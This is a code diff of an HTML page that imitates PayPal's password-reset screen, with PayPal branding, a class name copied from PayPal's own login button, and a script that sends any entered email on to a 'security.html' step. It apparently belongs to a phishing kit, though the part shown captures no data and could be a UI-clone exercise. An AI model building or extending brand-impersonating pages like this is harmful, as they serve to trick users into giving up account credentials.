@@ -13,20 +13,38 @@
 </head>
 <body>
     <div  class="center" >
-     <img src="   ../images/paypalfavicon.png" alt="paypal">
+     <img src="   ./images/paypalfavicon.png" alt="paypal">
 
     <div class="content">
 <h1>Need help with your <br> password?</h1>
 <p>Enter the email you use for PayPal, and we’ll help you create <br> a new password.</p>
 <input type="email" id="email" name="email" placeholder="Email">
+<div class="hideone">Email is required</div>
      <!-- <p id="next" class="next" onclick="alert('clicked')">Next</p> -->
 
     <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin"
         value="Login">Next</button>
     </div>
 <br><br>
-    <a>Return to PayPal login</a>
+    <a href="index.html">Return to PayPal login</a>
     </div>
-    
+    <script>
+
+document.querySelector("#email").onkeyup=()=>{
+    if(document.querySelector(".showError"))return document.querySelector(".showError").className="hideone"
+}
+
+
+
+        document.querySelector("#btnLogin").onclick=()=>{
+           if(document.getElementById("email").value){
+
+            window.location.href="security.html"
+
+           }
+           else
+           document.querySelector(".hideone").className="showError"
+        }
+    </script>
 </body>
 </html>
